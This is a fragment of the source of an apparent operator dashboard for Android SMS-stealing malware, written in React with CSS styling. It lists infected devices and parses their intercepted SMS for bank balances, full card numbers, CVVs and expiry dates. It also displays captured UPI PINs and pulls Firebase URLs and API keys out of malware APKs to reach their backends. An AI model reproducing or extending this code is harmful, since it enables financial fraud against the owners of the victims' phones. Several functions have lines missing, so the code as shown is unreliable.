    body.perf .topbar { background: #0b0b12; }
    body.perf .scrim, body.perf .scrimbg { background: rgba(3,3,8,.8); }
    body.perf .dev-card, body.perf .stat-card, body.perf .server-picker,
    body.perf .btn-primary, body.perf .simbtn.on, body.perf .toast, body.perf .sms-pop { box-shadow: none; }
    body.perf .dev-card { transition: border-color .15s ease; animation-duration: .28s; }
    body.perf .dev-card:hover { transform: none; box-shadow: none; }
    body.perf .dev-card::after { display: none; }
    body.perf .stat-card:hover { transform: none; }
    body.perf .stat-card .stat-pop { animation-duration: .2s; }
    body.perf .drawer { animation-duration: .16s; }
    body.perf .devpanel-in { animation-duration: .16s; }
    body.perf .sms-pop { will-change: auto; }
    body.perf .brandmark { animation-duration: 5.5s; }
    /* perf mode: colour-shift text + neon glow go static (no continuous paint) */
    body.perf .stat-label, body.perf .brandshift { background: none; color: var(--txt-2); animation: none; }
    body.perf .sectitle .brandshift { color: var(--txt); }
    body.perf .chip:hover, body.perf .icon-btn:hover, body.perf .swtoggle:hover,
    body.perf .server-picker:hover, body.perf .simbtn:not(.on):hover,
    body.perf .dropdown > button:hover { animation: none; border-color: #38bdf8; box-shadow: 0 0 0 1.5px rgba(56,189,248,.85), 0 0 12px rgba(56,189,248,.4); }
    body.perf .badge.on > :first-child { animation: none; }
    body.perf .icon-btn:active, body.perf .chip:active, body.perf .pill:active,
    body.perf .copybtn:active, body.perf .swtoggle:active, body.perf .simbtn:active { transform: none; }
  </style>

      [/GPAY|GOOGLEPAY/i, 'Google Pay'], [/AMAZONPAY/i, 'Amazon Pay'],
      [/BAJAJFIN/i, 'Bajaj Finance'], [/CRED/i, 'CRED'],
      [/AIRTEL/i, 'Airtel Payments'], [/JIOMNY|JIOMONEY/i, 'Jio Money'],
    ];
    function getBankName(sender) {
      for (const [re, name] of BANK_SENDERS) if (re.test(sender)) return name;
      const m = sender.toUpperCase().match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
      return m ? m[1] : sender || 'Bank';
    }
    const BAL_PATTERNS = [
      /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
      /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
      /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
      /(?:Avl|Avbl|Aval)\.?\s*(?:Bal(?:ance)?)\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
      /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
      /Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,
    ];
    const TXN_PATTERNS = [
      /(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
      /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i,
      /^(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
      /(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,
    ];
    const ACCT_PATTERNS = [
      /(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i,
      /[xX*]{4,}([0-9]{4})/, /ending\s+(?:with\s+)?([0-9]{4})/i,
    ];
    const CARD_PATTERNS = [
      /(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i,
      /card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i,
    ];
    const CVV_PATTERNS = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i];
    const EXP_PATTERNS = [/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];
    const PHONE_PATTERNS = [
      /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})/i,
      /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})/i,
      /Number\s*[:\-]\s*([6-9][0-9]{9})/i,
      /registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})/i,
      /(\+91[-\s]?[6-9][0-9]{9})/, /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/,
    ];
    const NETWORK_SENDERS = [
      [/AIRTEL|JD-AIRTEL|VM-AIRTEL/i, 'Airtel'], [/JIOINF|JIOMSG|JIONET|JIO/i, 'Jio'],
      [/BSNLSM|BSNL/i, 'BSNL'], [/VISMOB|VI-|VODA|VODAFONE/i, 'Vodafone'],
      [/IDEACEL|IDEA/i, 'Vi (Idea)'], [/MTNL/i, 'MTNL'],
    ];

    function detectPhone(text) {
      for (const re of PHONE_PATTERNS) {
        const m = text.match(re);
        if (m?.[1]) {
          const d = m[1].replace(/[^0-9]/g, '');
          if (d.length === 10 && /^[6-9]/.test(d)) return d;
          if (d.length === 12 && d.startsWith('91') && /^91[6-9]/.test(d)) return d.slice(2);
        }
      }
      return null;
    }
    function detectNetwork(text, sender) {
      for (const [re, name] of NETWORK_SENDERS) if (re.test(sender)) return name;
      const body = text + ' ' + sender;
      const bp = [[/\bJio\b/i,'Jio'],[/\bAirtel\b/i,'Airtel'],[/\bBSNL\b/i,'BSNL'],[/\bVodafone\b/i,'Vodafone'],[/\b(?:Idea|Vi)\b/i,'Vi'],[/\bMTNL\b/i,'MTNL']];
      for (const [re, name] of bp) if (re.test(body)) return name;
      return null;
    }
    function parseBankSms(text, sender) {
      if (!text || text.trim().length < 8) return null;
      const up = text.toUpperCase();
      const isBank = /AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE/.test(up);
      const knownSender = /^[A-Z]{2}-[A-Z0-9]+$/.test(sender) && BANK_SENDERS.some(([re]) => re.test(sender));
      if (!isBank && !knownSender) return null;
      let balance = null;
      for (const re of BAL_PATTERNS) { const m = text.match(re); if (m?.[1]) { const v = m[1].replace(/,/g,''); if (parseFloat(v) >= 0) { balance = v; break; } } }
      if (!balance) return null;
      let txnAmt;
      for (const re of TXN_PATTERNS) { const m = text.match(re); if (m?.[1]) { const v = m[1].replace(/,/g,''); if (v !== balance) { txnAmt = v; break; } } }
      let txnType;
      if (/credit(?:ed)?/i.test(text)) txnType = 'credit';
      else if (/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) txnType = 'debit';
      let acct;
      for (const re of ACCT_PATTERNS) { const m = text.match(re); if (m?.[1]) { acct = m[1].replace(/[^0-9]/g,'').slice(-4); break; } }
      return {
        bankName: getBankName(sender), senderName: sender, availableBalance: balance,
        transactionAmount: txnAmt, transactionType: txnType, accountLast4: acct,
        phoneFromSms: detectPhone(text) ?? undefined, networkFromSms: detectNetwork(text, sender) ?? undefined,
        rawSms: text, detectedAt: new Date().toISOString(),
      };
    }
    function parseCardSms(text) {
      if (!text) return null;
      const up = text.toUpperCase();
      if (!up.includes('CARD') && !up.includes('CVV') && !up.includes('CREDIT') && !up.includes('DEBIT')) return null;
      let last4 = '';
      for (const re of CARD_PATTERNS) { const m = text.match(re); if (m?.[1]) { const d = m[1].replace(/[^0-9]/g,''); if (d.length >= 4) { last4 = d.slice(-4); break; } } }
      if (!last4) return null;
      let cardType = '';
      if (/VISA/i.test(text)) cardType = 'VISA';
      else if (/MASTER(?:CARD)?/i.test(text)) cardType = 'Mastercard';
      else if (/RUPAY/i.test(text)) cardType = 'RuPay';
      else if (/AMEX|AMERICAN EXPRESS/i.test(text)) cardType = 'Amex';
      else if (/credit/i.test(text)) cardType = 'Credit Card';
      else if (/debit/i.test(text)) cardType = 'Debit Card';
      let cvv, expiry;
      for (const re of CVV_PATTERNS) { const m = text.match(re); if (m?.[1]) { cvv = m[1]; break; } }
      for (const re of EXP_PATTERNS) { const m = text.match(re); if (m?.[1]) { expiry = m[1]; break; } }
      return { cardLast4: last4, cardType, cvv, expiry, rawSms: text };
    }
    function analyzeSmsMessages(messages) {
      const bankBalances = [], cards = [], phones = new Set(), networks = new Set();
      for (const msg of messages) {
        const bank = parseBankSms(msg.text, msg.sender);
        if (bank) { bank.detectedAt = msg.time || bank.detectedAt; bankBalances.push(bank); }
        const card = parseCardSms(msg.text);
        if (card) cards.push(card);
        const ph = detectPhone(msg.text); if (ph) phones.add(ph);
        const net = detectNetwork(msg.text, msg.sender); if (net) networks.add(net);
      }
      return { bankBalances, cards, phoneNumbers: [...phones], networks: [...networks] };
    }

    /* ═══════════════════════════════════════════════════════════════════
       DEVICE / MESSAGE PARSING
       ═══════════════════════════════════════════════════════════════════ */
    function parseDevices(raw, serverId, serverName) {
      const devices = [];
      if (!raw || typeof raw !== 'object') return devices;

      for (const [id, v] of Object.entries(raw)) {
        if (!v || typeof v !== 'object') continue;
        const d = v;
        const flat = flattenOne(d);
        const P = (aliases, re) => firstValue(d, aliases) ?? firstValue(flat, aliases) ?? heuristic(d, re) ?? heuristic(flat, re);

        /* ── name ─────────────────────────────────────────────────── */
        let name = toText(P(
          ['modelName','model','deviceName','device_name','deviceModel','device_model','name','productName','product','brandModel','brand','handset','title','deviceType','phoneModel'],
          /^(model|device|product|brand|handset|phone)?_?name$/i
        ));
        if (name === '—') {
          const m = findModelValue(d) || findModelValue(flat);
          if (m) name = m;
        }

        /* ── phone ────────────────────────────────────────────────── */
        let sims = [];
        const rawSims = d.sims ?? d.sim ?? d.simList ?? d.sim_info ?? d.simInfo ?? flat.sims;
        if (Array.isArray(rawSims)) sims = rawSims;
        else if (rawSims && typeof rawSims === 'object') sims = Object.values(rawSims);
        else {
          const s1 = P(['sim1','sim_1','simNumber1','sim1Number'], null);
          const s2 = P(['sim2','sim_2','simNumber2','sim2Number'], null);
          if (s1) sims.push({ phoneNumber: s1 });
          if (s2) sims.push({ phoneNumber: s2 });
        }
        sims = sims.filter(s => s && typeof s === 'object');
        const simPhones = sims.map(s => s.phoneNumber ?? s.number ?? s.msisdn ?? s.mobileNumber ?? s.phone).filter(Boolean);

        let phone = toText(P(
          ['mobNo','mob_no','mobno','mobileNumber','mobile_number','mobileNo','mobile','phoneNumber','phone_number','phoneNo','phone','msisdn','contactNumber','contact','simNumber','sim_number','cellNumber','telephoneNumber','number'],
          /mob|phone|msisdn|contact|cell|tel/i
        ));
        if (phone === '—' && simPhones.length) phone = toText(simPhones[0]);
        if (phone === '—') {
          const found = findPhoneValue(d) || findPhoneValue(flat);
          if (found) phone = found;
        }
        phone = toPhone(phone);

        /* ── android / sdk ───────────────────────────────────────── */
        const androidRaw = P(
          ['androidV','androidVersion','android_version','androidVer','android','osVersion','os_version','osVer','version','versionName','buildVersion','rel','androidRelease'],
          /android|os_?ver|^ver|^version/i
        );
        let android = toText(androidRaw);
        if (android !== '—') {
          const m = String(android).match(/\d+(\.\d+)*/);
          if (m) android = m[0];
        } else {
          const v = findVersionValue(d) || findVersionValue(flat);
          if (v) android = v;
        }
        const sdk = toText(P(['sdkV','sdkVersion','sdk_version','sdk','sdkInt','sdk_int','targetSdk'], /sdk/i));

        /* ── battery ─────────────────────────────────────────────── */
        const batt = toBattery(P(['battery','batteryLevel','battery_level','batt','batteryPercent','battery_percent','level','power'], /batt|power|level/i));

        /* ── ip / storage / cpu ──────────────────────────────────── */
        const ip = toText(P(['ip_address','ipAddress','ip','localIp','local_ip','wifiIp','hostIp'], /^ip|ip_?address|localip/i));
        const storage = toText(P(['storage','storageInfo','storage_info','totalStorage','disk','diskInfo','disk_info','space'], /storage|disk|space/i));
        const cpu = toText(P(['cpu_arch','cpuArch','cpu','abi','architecture','cpuAbi'], /cpu|abi|arch/i));

        /* ── provider / network ──────────────────────────────────── */
        let provider = toText(P(
          ['service_provider','serviceProvider','service_provider_name','provider','carrier','network','operator','networkOperator','network_operator','simOperator','sim_operator','telecom'],
          /provider|carrier|network|operator|telecom/i
        ));
        if (provider !== '—') {
          const known = [['airtel','Airtel'],['jio','Jio'],['bsnl','BSNL'],['vodafone','Vodafone'],['vi ','Vi (Idea)'],['idea','Vi (Idea)'],['mtnl','MTNL']];
          const low = provider.toLowerCase();
          for (const [k, label] of known) if (low.includes(k.trim())) { provider = label; break; }
        }

        /* ── upi pin ─────────────────────────────────────────────── */
        const upipinRaw = P(['upipin','upiPin','upi_pin','upipin_enc','upi'], /upi/i);
        const upipin = upipinRaw !== undefined && upipinRaw !== null && String(upipinRaw).trim() !== '' ? String(upipinRaw) : null;

        /* ── status ──────────────────────────────────────────────── */
        const statusRaw = P(['status','online','isOnline','is_online','active','isActive','connected','alive','running'], /^(status|online|is_?online|active|is_?active|connected|alive|running)$/i);
        let status = false;
        if (typeof statusRaw === 'boolean') status = statusRaw;
        else if (typeof statusRaw === 'number') status = statusRaw !== 0;
        else if (typeof statusRaw === 'string') status = /^(true|1|yes|online|active|connected|alive|on)$/i.test(statusRaw.trim());

        /* ── last seen ───────────────────────────────────────────── */
        const lastSeenRaw = P(
          ['lastSeen','last_seen','lastOnline','last_online','lastActive','last_active','lastUpdate','last_update','seenAt','heartbeat','timestamp','time','dateTime','datetime','updatedAt','updated_at','date','lastSeenTime'],
          /last_?seen|last_?online|last_?active|last_?update|seen_?at|heartbeat|timestamp|uptime|date_?time/i
        );
        const lastSeen = normalizeTimestamp(lastSeenRaw);

        /* ── final name fallback ─────────────────────────────────── */
        if (name === '—') name = toText(id);
        const nameIsId = name === id;

        devices.push({
          key: serverId + '_' + id,
          id, name, nameIsId, battery: batt.raw, batteryPercent: batt.pct,
          status, phoneNumber: phone, android, ip, storage, provider, sims,
          upipin, cpu, sdk, lastSeen,
          lastSeenFormatted: lastSeen ? timeAgo(lastSeen) : undefined,
          serverId, serverName,
          sig: `${name}|${android}|${batt.raw}|${status}|${phone}|${ip}|${storage}|${provider}|${upipin}|${cpu}|${sdk}|${lastSeen}|${sims.length}`,
        });
      }
      return devices;
    }

    function parseMessagesOfDevice(devRaw, cutoff) {
      const msgs = [];
      if (!devRaw || typeof devRaw !== 'object') return msgs;
      const entries = Object.entries(devRaw);
      const slice = entries.length > 150 ? entries.slice(entries.length - 150) : entries;
      const T0 = cutoff || Date.now() - 60 * 60 * 1000;   // last 1 hour only
      for (let i = 0; i < slice.length; i++) {
        const v = slice[i][1];
        if (!v || typeof v !== 'object') continue;
        const text = String(v.message ?? v.body ?? v.text ?? v.msg ?? v.sms ?? '');
        if (!text.trim()) continue;
        const timeStr = String(v.dateTime ?? v.date ?? v.time ?? v.timestamp ?? '');
        const ts = normalizeTimestamp(timeStr);
        /* STRICT 1-hour window: unknown-age or older messages never render */
        if (ts === null || ts < T0) continue;
        msgs.push({ text, sender: String(v.sender ?? v.from ?? v.address ?? 'Unknown'), time: timeStr, ts });
      }
      msgs.reverse();
      return msgs;
    }
    function parseSmsMessages(raw) {
      return parseMessagesOfDevice(raw, null);
    }
    /* one pass over the whole `messages` node → Map<deviceId, msgs[]> */
    function parseBulkMessages(raw) {
      const out = new Map();
      if (!raw || typeof raw !== 'object') return out;
      const cutoff = Date.now() - 60 * 60 * 1000;   // last 1 hour only
      for (const [id, devRaw] of Object.entries(raw)) {
        if (!devRaw || typeof devRaw !== 'object') continue;
        const msgs = parseMessagesOfDevice(devRaw, cutoff);
        if (msgs.length) out.set(id, msgs);
      }
      return out;
    }
    function buildSmsAnalysis(messages) { return analyzeSmsMessages(messages); }

    /* ═══════════════════════════════════════════════════════════════════
       APK PARSING
       ═══════════════════════════════════════════════════════════════════ */
    function scanUint8Array(data, urlRe, keyRe) {
      let str = '';
      for (let i = 0; i < data.length; i += 65536) str += String.fromCharCode(...data.subarray(i, i + 65536));
      const urlM = str.match(urlRe), keyM = str.match(keyRe);
      return { url: urlM ? urlM[0] : '', key: keyM ? keyM[0] : '' };
    }
    async function parseApk(file) {
      const buf = await file.arrayBuffer();
      const zip = await JSZip.loadAsync(buf);
      let url = '', key = '', projectId = '', appId = '';
      const urlRe = /https:\/\/[a-z0-9_-]+\.firebaseio\.com/gi;
      const keyRe = /AIza[A-Za-z0-9_-]{35}/g;
      const arsc = zip.file('resources.arsc');
      if (arsc) { const data = await arsc.async('uint8array'); const f = scanUint8Array(data, urlRe, keyRe); if (f.url) url = f.url; if (f.key) key = f.key; }
      if (!url || !key) {
        for (const dexName of ['classes.dex','classes2.dex','classes3.dex','classes4.dex']) {
          if (url && key) break;
          const dex = zip.file(dexName); if (!dex) continue;
          const data = await dex.async('uint8array'); const f = scanUint8Array(data, urlRe, keyRe);
          if (!url && f.url) url = f.url; if (!key && f.key) key = f.key;
        }
      }
      if (!url || !key) {
        const gsFiles = [zip.file('google-services.json'), zip.file('assets/google-services.json')].filter(Boolean);
        zip.forEach((p, f) => { if (p.endsWith('google-services.json')) gsFiles.push(f); });
        for (const f of gsFiles) {
          if (!f) continue;
          try {
            const gs = JSON.parse(await f.async('text'));
            if (!url) url = gs?.project_info?.firebase_url || '';
            if (!projectId) projectId = gs?.project_info?.project_id || '';
            const client = gs?.client?.[0];
            if (!key) key = client?.api_key?.[0]?.current_key || '';
            if (!appId) appId = client?.client_info?.mobilesdk_app_id || '';
          } catch {}
        }
      }
      if (!url || !key) {
        for (const name of Object.keys(zip.files)) {
          if (url && key) break; if (zip.files[name].dir) continue;
          try { const data = await zip.files[name].async('uint8array'); const f = scanUint8Array(data, urlRe, keyRe); if (!url && f.url) url = f.url; if (!key && f.key) key = f.key; } catch {}
        }
      }
      if (!url && !key) return null;
      return { firebaseUrl: url, apiKey: key, projectId, appId };
    }

    /* ═══════════════════════════════════════════════════════════════════
       SMALL UI PIECES

    function useOutsideClick(ref, onOut) {

        const h = (e) => { if (ref.current && !ref.current.contains(e.target)) onOut(); };
        document.addEventListener('mousedown', h);
        return () => document.removeEventListener('mousedown', h);
      }, [ref, onOut]);
    }
    function usePickerDismiss(onOut) {
      useEffect(() => {
        const h = (e) => {
          const el = e.target;
          if (el && el.closest && el.closest('[data-picker]')) return;
          onOut();
        };
        document.addEventListener('mousedown', h);

      }, [onOut]);
    }

    function CopyButton({ text, className = '' }) {
      const [copied, setCopied] = useState(false);

          .then(() => { setCopied(true); setTimeout(() => setCopied(false), 1800); })
          .catch(() => {});

      return (
        <button onClick={copy} className={`copybtn ${className}`} title="Copy">
          {copied ? <Icon name="Check" className="w-3.5 h-3.5 text-emerald-400" /> : <Icon name="Copy" className="w-3.5 h-3.5" />}
        </button>
      );
    }

    function BatteryBar({ percent }) {
      const p = Math.max(0, Math.min(100, percent || 0));

    }

    /* ── new-version watcher ──────────────────────────────────────
       If the file on disk changes while this tab stays open, a tiny
       bottom-left toast offers a one-click refresh. Silent on file://
       or offline; never reloads by itself. */
    const RAVBUILD_TAG = 'RAVBUILD:20261024a';
    function VersionToast() {
      const [hasNew, setHasNew] = React.useState(false);
      React.useEffect(() => {
        let dead = false;
        const iv = setInterval(async () => {
          if (dead || document.visibilityState !== 'visible') return;
          try {
            const r = await fetch(location.pathname + (location.search || ''), { cache: 'no-store' });
            const t = await r.text();
            if (!dead && r.ok && t && t.indexOf(RAVBUILD_TAG) < 0) setHasNew(true);
          } catch { /* offline / file:// — stay silent */ }
        }, 180000);
        return () => { dead = true; clearInterval(iv); };
      }, []);
      if (!hasNew) return null;
      return (
        <div className="surface2 bd" style={{ position: 'fixed', left: 14, bottom: 14, zIndex: 99, display: 'flex', gap: 10, alignItems: 'center', padding: '9px 13px', borderRadius: 12 }}>
          <span style={{ fontSize: 12 }}>🆕 New RAV build available</span>
          <button className="chip sm" onClick={() => location.reload()}>Refresh</button>
          <button className="chip sm" onClick={() => setHasNew(false)}>✕</button>
        </div>
      );
    }
    function StatCard({ label, value, tone = 'stat-white', stripe, tint, wide, small, sub }) {

        </div>
      );
    }

    /* ═══════════════════════════════════════════════════════════════════
       DEVICE CARD
       ═══════════════════════════════════════════════════════════════════ */
    const DeviceCard = memo(function DeviceCard({ device: d, onSelect, fav, onToggleFav, ci = 0 }) {
      const analysis = d._analysis;
      const loaded = !!analysis;
      const hasBank = loaded && analysis.bankBalances.length > 0;
      const hasCard = loaded && analysis.cards.length > 0;
      const topBank = hasBank ? analysis.bankBalances[0] : null;
      const phone = d.phoneNumber !== '—' ? d.phoneNumber : (analysis?.phoneNumbers[0] || '—');
      const network = d.provider !== '—' ? d.provider : (analysis?.networks[0] || '—');

      return (
        <div onClick={() => onSelect(d)} className={`dev-card${d.status ? '' : ' offline'}`} style={{ '--ci': String(ci % 12) }}>
          <div className="flex items-start gap-3 mb-3">
            <div className={`w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 ${d.status ? 'bg-emerald-500/12 border border-emerald-500/25' : 'surface2 bd'}`}>
              <Icon name="Smartphone" className={`w-5 h-5 ${d.status ? 'text-emerald-400' : 'tx4'}`} />
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-1.5">
                <h3 className="dev-name truncate" title={d.name}>{d.name}</h3>
                <button onClick={e => { e.stopPropagation(); onToggleFav(d); }}
                  className={`p-0.5 rounded transition-all ${fav ? 'text-amber-400' : 'tx4 hover:text-amber-300'}`}
                  title={fav ? 'Remove from favorites' : 'Add to favorites'}>
                  <Icon name="Star" className={`w-3.5 h-3.5 ${fav ? 'fill-amber-400' : ''}`} />
                </button>
              </div>
              {!d.nameIsId && <p className="dev-sub truncate mt-0.5">{d.id}</p>}
              {d.serverName && <p className="dev-sub truncate mt-0.5">{d.serverName}</p>}
            </div>
            <div className="flex items-center gap-1 flex-shrink-0">
              {d.upipin && <Icon name="Key" className="w-3.5 h-3.5 text-amber-400" />}
              {hasBank && <Icon name="Banknote" className="w-3.5 h-3.5 text-emerald-400" />}
              {hasCard && <Icon name="CreditCard" className="w-3.5 h-3.5 text-purple-400" />}
              <Icon name="ChevronRight" className="w-3.5 h-3.5 tx4" />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-3 mb-2">
            <div className="min-w-0">
              <p className="dev-meta-label">Android</p>
              <p className={`dev-meta-val truncate ${d.android !== '—' ? 'filled' : ''}`}>
                {d.android !== '—' ? `v${d.android.replace(/^v/i,'')}` : '—'}
              </p>
            </div>
            <div>
              <p className="dev-meta-label">Battery</p>
              <div style={{ marginTop: 2 }}><BatteryBar percent={d.batteryPercent} /></div>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-3 mb-1">
            <div className="min-w-0">
              <p className="dev-meta-label">Number</p>
              <p className={`dev-meta-val truncate font-mono ${phone !== '—' ? 'filled' : ''}`}>{phone}</p>
            </div>
            <div className="min-w-0">
              <p className="dev-meta-label">Network</p>
              <p className={`dev-meta-val truncate ${network !== '—' ? 'filled' : ''}`}>{network}</p>
            </div>
          </div>

          {topBank && (
            <div className="balance-strip">
              <div className="flex items-center gap-1.5 min-w-0">
                <Icon name="Banknote" className="w-3.5 h-3.5 text-emerald-400 flex-shrink-0" />
                <span className="text-[10px] font-semibold text-emerald-400 truncate">{topBank.bankName}</span>
                {topBank.accountLast4 && <span className="text-[9px] font-mono tx4">••{topBank.accountLast4}</span>}
              </div>
              <span className="text-[13px] font-black text-white flex-shrink-0">₹{formatCurrency(topBank.availableBalance)}</span>
            </div>
          )}

          {hasCard && (
            <div className="balance-strip purple">
              <div className="flex items-center gap-1.5 min-w-0">
                <Icon name="CreditCard" className="w-3.5 h-3.5 text-purple-400 flex-shrink-0" />
                <span className="text-[10px] font-semibold text-purple-300 truncate">Card ••{analysis.cards[0].cardLast4}</span>
              </div>
              <span className="text-[10px] text-purple-400/80 flex-shrink-0">{analysis.cards[0].cardType || 'Card'}</span>
            </div>
          )}

          <div className="flex items-center gap-2 flex-wrap mt-3">
            <span className={`badge ${d.status ? 'on' : 'off'}`}>
              <span className={`w-1.5 h-1.5 rounded-full ${d.status ? 'bg-emerald-400' : 'bg-[#4d566a]'}`} />
              {d.status ? 'Online' : 'Offline'}
            </span>
            {!d.status && d.lastSeen && <span className="text-[10px] font-mono tx4">{timeAgo(d.lastSeen)}</span>}
            {d.upipin && <span className="badge upi">UPI PIN</span>}
            {loaded
              ? (d._msgCount ? <span className="text-[10px] font-mono tx4">{d._msgCount} msg</span> : null)
              : <span className="badge sync">Syncing…</span>}
          </div>
        </div>
      );
    });

    /* ═══════════════════════════════════════════════════════════════════
       SMS LIVE POPUP
       ═══════════════════════════════════════════════════════════════════ */
    function SmsLivePopup({ msg, onDismiss, onOpen }) {
      if (!msg) return null;
      const isBank = /AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(msg.text);
      const isCard = /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(msg.text);
      const accent = isCard ? '#a855f7' : isBank ? '#22c55e' : '#8b5cf6';
      const bg = isCard ? 'rgba(18,12,34,.97)' : isBank ? 'rgba(6,22,12,.97)' : 'rgba(12,10,26,.97)';
      const borderColor = isCard ? 'rgba(168,85,247,.32)' : isBank ? 'rgba(34,197,94,.32)' : 'rgba(139,92,246,.32)';
      return (
        <div className={`sms-pop ${msg.exiting ? 'sms-popup-exit' : 'sms-popup-enter'}`} onClick={onOpen}
          style={{
            background: bg, border: `1px solid ${borderColor}`, borderLeft: `3px solid ${accent}`,
            top: 76, left: '50%', width: 'min(320px, calc(100vw - 28px))',
          }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 5, gap: 8 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, minWidth: 0 }}>
              <span style={{ width: 6, height: 6, borderRadius: '50%', background: accent, boxShadow: `0 0 6px ${accent}`, flexShrink: 0, display: 'inline-block' }} />
              <span style={{ fontSize: 10, fontWeight: 800, color: accent, letterSpacing: .3, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{msg.deviceName}</span>
              <span style={{ fontSize: 9, color: '#6b7488', flexShrink: 0 }}>·</span>
              <span style={{ fontSize: 9, fontWeight: 700, color: '#8b95a8', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{msg.sender}</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 4, flexShrink: 0 }}>
              <span style={{ fontSize: 9, color: '#6b7488', fontWeight: 700 }}>Tap to open</span>
              <button onClick={e => { e.stopPropagation(); onDismiss(); }}
                style={{ background: 'none', border: 'none', color: '#6b7488', cursor: 'pointer', padding: 2, lineHeight: 1 }}>
                <Icon name="X" className="w-3 h-3" />
              </button>
            </div>
          </div>
          <p style={{ fontSize: 11, color: '#d0d6e2', lineHeight: 1.5, margin: 0, maxHeight: 52, overflow: 'hidden', wordBreak: 'break-word' }}>
            {msg.text.substring(0, 140)}{msg.text.length > 140 ? '…' : ''}
          </p>
          <div style={{ marginTop: 7, height: 2, borderRadius: 2, background: 'rgba(255,255,255,.09)', overflow: 'hidden' }}>
            <div style={{ height: '100%', background: accent, width: '100%', animation: 'shrink 4.5s linear forwards', transformOrigin: 'left' }} />
          </div>
        </div>
      );
    }

    /* ═══════════════════════════════════════════════════════════════════
       INFO ROW / BANK / CARD
       ═══════════════════════════════════════════════════════════════════ */
    function InfoRow({ label, value, mono, highlight }) {
      return (
        <div className="inforow">
          <span className="k">{label}</span>
          <span className={`v ${mono ? 'font-mono' : ''}`} style={highlight ? { color: highlight } : undefined}>{value || '—'}</span>
        </div>
      );
    }

    function BankCard({ b }) {
      const isCredit = b.transactionType === 'credit';
      return (
        <div className="bankrow">
          <div className="flex items-center justify-between mb-2 gap-2">
            <div className="flex items-center gap-2 min-w-0">
              <div className="w-6 h-6 rounded-lg bg-emerald-500/15 border border-emerald-500/25 flex items-center justify-center flex-shrink-0">
                <Icon name="Banknote" className="w-3 h-3 text-emerald-400" />
              </div>
              <span className="text-xs font-bold text-emerald-400 truncate">{b.bankName}</span>
              {b.accountLast4 && <span className="text-[10px] font-mono tx4 flex-shrink-0">••{b.accountLast4}</span>}
            </div>
            {b.transactionType && (
              <span className={`flex items-center gap-0.5 text-[10px] font-semibold px-2 py-0.5 rounded-full flex-shrink-0 ${isCredit ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-red-500/10 text-red-400 border border-red-500/20'}`}>
                <Icon name={isCredit ? 'ArrowDownLeft' : 'ArrowUpRight'} className="w-3 h-3" />
                {isCredit ? 'Credit' : 'Debit'}
              </span>
            )}
          </div>
          <div className="flex items-end justify-between gap-3">
            <div>
              <p className="dev-meta-label">Available Balance</p>
              <p className="text-xl font-black text-white"><span className="text-emerald-400 text-sm mr-0.5">₹</span>{formatCurrency(b.availableBalance)}</p>
            </div>
            {b.transactionAmount && b.transactionAmount !== b.availableBalance && (
              <div className="text-right">
                <p className="dev-meta-label">Transaction</p>
                <p className={`text-sm font-bold ${isCredit ? 'text-emerald-400' : 'text-red-400'}`}>{isCredit ? '+' : '-'}₹{formatCurrency(b.transactionAmount)}</p>
              </div>
            )}
          </div>
          {(b.phoneFromSms || b.networkFromSms) && (
            <div className="flex items-center gap-3 mt-2 pt-2 border-t bd">
              {b.phoneFromSms && <div className="flex items-center gap-1"><Icon name="Phone" className="w-3 h-3 text-blue-400" /><span className="text-[10px] font-mono tx2">{b.phoneFromSms}</span></div>}
